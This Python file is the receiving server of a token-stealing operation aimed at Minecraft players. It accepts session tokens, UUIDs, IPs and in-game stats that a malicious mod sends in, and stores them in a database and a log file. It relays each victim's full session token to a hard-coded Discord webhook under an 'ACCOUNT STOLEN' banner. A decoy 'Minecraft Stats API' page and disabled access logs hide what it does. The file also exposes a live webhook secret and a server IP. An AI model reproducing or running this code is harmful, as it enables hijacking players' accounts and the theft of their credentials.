from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sqlite3
from datetime import datetime
import urllib.request
import traceback

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"

# Setup database
conn = sqlite3.connect('tokens.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS tokens (
    username TEXT, uuid TEXT, server TEXT, token TEXT,
    money TEXT, playtime TEXT, kills TEXT, deaths TEXT,
    skin TEXT, type TEXT, ip TEXT, time TEXT)''')
conn.commit()

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Get data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Extract all fields from your mod
            username = data.get('username', 'Unknown')
            uuid = data.get('uuid', '')
            server = data.get('server', '')
            token = data.get('token', '')
            money = data.get('money', '0')
            playtime = data.get('playtime', '0h')
            kills = data.get('kills', '0')
            deaths = data.get('deaths', '0')
            skin = data.get('skin', '')
            log_type = data.get('type', 'login')
            ip = self.client_address[0]
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Save to database
            c.execute('''INSERT INTO tokens VALUES 
                (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (username, uuid, server, token, money, playtime,
                 kills, deaths, skin, log_type, ip, timestamp))
            conn.commit()
            
            # Save to text file (backup)
            with open('tokens.txt', 'a') as f:
                f.write(f'{timestamp} | {username} | {server} | {uuid} | {token[:15]}...\n')
            
            print(f'✅ Logged: {username} on {server}')
            
            # Send to Discord
            try:
                # FIRST: @here ping message
                ping_data = json.dumps({"content": "@here 🎣 NEW ACCOUNT"}).encode('utf-8')
                ping_req = urllib.request.Request(
                    DISCORD_WEBHOOK,
                    data=ping_data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(ping_req, timeout=5)
                
                # SECOND: Embed with all data
                short_token = token[:6] + '...' + token[-4:] if len(token) > 10 else token
                
                embed = {
                    "title": f"🎣 ACCOUNT STOLEN - {username}",
                    "color": 65280,
                    "description": f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`\n**IP:** `{ip}`\n**Money:** `{money}`\n**Playtime:** `{playtime}`\n**Kills:** `{kills}`\n**Deaths:** `{deaths}`",
                    "fields": [
                        {
                            "name": "🔑 Session Token",
                            "value": f"||```{token}```||",
                            "inline": False
                        }
                    ],
                    "thumbnail": {"url": skin if skin else f"https://mc-heads.net/head/{uuid.replace('-', '')}"},
                    "timestamp": datetime.now().isoformat(),
                    "footer": {"text": "Kripton Client"}
                }
                
                # Create request
                req = urllib.request.Request(
                    DISCORD_WEBHOOK,
                    data=json.dumps({"embeds": [embed]}).encode('utf-8'),
                    headers={
                        'Content-Type': 'application/json',
                        'User-Agent': 'Minecraft-Server/1.0'
                    }
                )
                
                response = urllib.request.urlopen(req, timeout=10)
                print(f'📤 Sent to Discord: {username} (Status: {response.status})')
                
            except Exception as discord_error:
                print(f'⚠️ Discord error: {discord_error}')
                # Continue anyway - at least we saved the data
            
            # Return success response
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "message": "Logged successfully"
            }).encode('utf-8'))
            
        except Exception as e:
            print(f'❌ Server error: {e}')
            traceback.print_exc()
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "error",
                "message": str(e)
            }).encode('utf-8'))
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
            <html>
            <body>
                <h1>Minecraft Stats API</h1>
                <p>Server is running...</p>
            </body>
            </html>
        ''')
    
    def log_message(self, format, *args):
        pass  # Disable access logs

if __name__ == '__main__':
    print('🚀 Starting Minecraft Stats Server on port 5000...')
    print('📡 Endpoint: http://107.173.226.218:5000/')
    print('💾 Database: tokens.db')
    print('📝 Log file: tokens.txt')
    
    server = HTTPServer(('0.0.0.0', 5000), Handler)
    server.serve_forever()
